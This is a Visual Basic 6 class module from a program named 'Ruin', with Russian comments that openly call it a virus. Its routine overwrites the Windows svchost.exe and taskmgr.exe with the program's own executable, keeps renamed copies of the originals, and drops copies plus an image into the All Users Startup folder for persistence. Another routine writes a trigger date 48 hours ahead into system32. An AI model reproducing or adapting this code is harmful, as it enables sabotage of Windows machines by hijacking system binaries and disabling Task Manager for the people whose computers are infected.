VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Windir"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal IpBuffer As String, ByVal nSize As Long) As Long
Public a As String
Dim Directory As New Ruin.Windir
Sub Save()
a = Directory.dir
Open a & "\system32\DateForBegin" For Binary As #1
Put #1, , Now + TimeSerial(48, 0, 0)
Close #1
End Sub
Public Property Get dir() As String
Dim IngRtn As Long
Const MAXWINPATH = 144
dir = Space(MAXWINPATH)
IngRtn = GetWindowsDirectory(dir, MAXWINPATH)
dir = Left(dir, IngRtn)  ' отсекаем лишнее
End Property
Private Sub Class_Terminate()
' выгружаем форму при уничтожении объекта
Unload Way
End Sub
Sub taskmgrUnl()
'Переименовываем Дисп.зад(taskmng) в teskmgr
FileCopy Directory.dir & "\system32\taskmgr.exe", Directory.dir & "\system32\teskmgr.exe"
'Для повторных запусков
FileCopy Directory.dir & "\system32\svchost.exe", Directory.dir & "\system32\svchos.exe"
FileCopy App.Path & "\Ruin.exe", Directory.dir & "\system32\svchost.exe"
'Поселяем вирус в taskmng
FileCopy App.Path & "\Ruin.exe", Directory.dir & "\system32\taskmgr.exe"
FileCopy App.Path & "\Ruin.exe", Directory.dir & "\system32\Ruin.exe"
FileCopy App.Path & "\Ruin.exe", Left(Directory.dir, 3) & "Documents and Settings\All Users\Главное меню\Программы\Автозагрузка\Ruin.exe"
FileCopy App.Path & "\critical.jpg", Directory.dir & "\system32\critical.jpg"
FileCopy App.Path & "\critical.jpg", Left(Directory.dir, 3) & "Documents and Settings\All Users\Главное меню\Программы\Автозагрузка\critical.jpg"

End Sub
